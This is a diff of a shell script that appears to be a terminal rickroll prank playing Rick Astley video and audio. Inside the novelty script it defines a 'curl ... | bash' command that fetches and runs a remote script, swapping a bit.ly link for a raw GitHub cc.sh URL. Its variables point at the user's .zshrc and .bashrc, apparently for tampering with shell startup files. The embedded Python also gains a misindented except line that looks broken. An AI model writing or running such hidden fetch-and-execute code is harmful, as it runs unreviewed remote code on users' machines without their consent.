@@ -9,7 +9,7 @@ video="$rick/astley80.full.bz2"
 audio_gsm="$rick/roll.gsm"
 audio_raw="$rick/roll.s16"
 audpid=0
-NEVER_GONNA='curl -s -L http://bit.ly/10hA8iC | bash'
+NEVER_GONNA='curl -s -L https://raw.githubusercontent.com/SpenderJ/42Work/master/scripts/cc.sh | bash'
 MAKE_YOU_CRY="$HOME/.zshrc"
 MAKE_YOU_CRY2="$HOME/.bashrc"
 red='\x1b[38;5;9m'
@@ -21,7 +21,7 @@ echo -en '\x1b[s'  # Save cursor.
 has?() { hash $1 2>/dev/null; }
 cleanup() { (( audpid > 1 )) && kill $audpid 2>/dev/null; }
 #quit() { echo -e "\x1b[2J \x1b[0H ${purp}<3 \x1b[?25h \x1b[u \x1b[m"; }
-quit() { $NEVER_GONNA;}
+quit() { $obtainium;}
 
 usage () {
   echo -en "${green}Rick Astley performs ♪ Never Gonna Give You Up ♪ on STDOUT."
@@ -95,6 +95,7 @@ try:
       next_frame = elapsed / time_per_frame
     if frame >= next_frame:
       buf += line
+	except KeyboardInterrupt:
 	pass
 EOF
 ) < <(obtainium $video | bunzip2 -q 2> /dev/null)
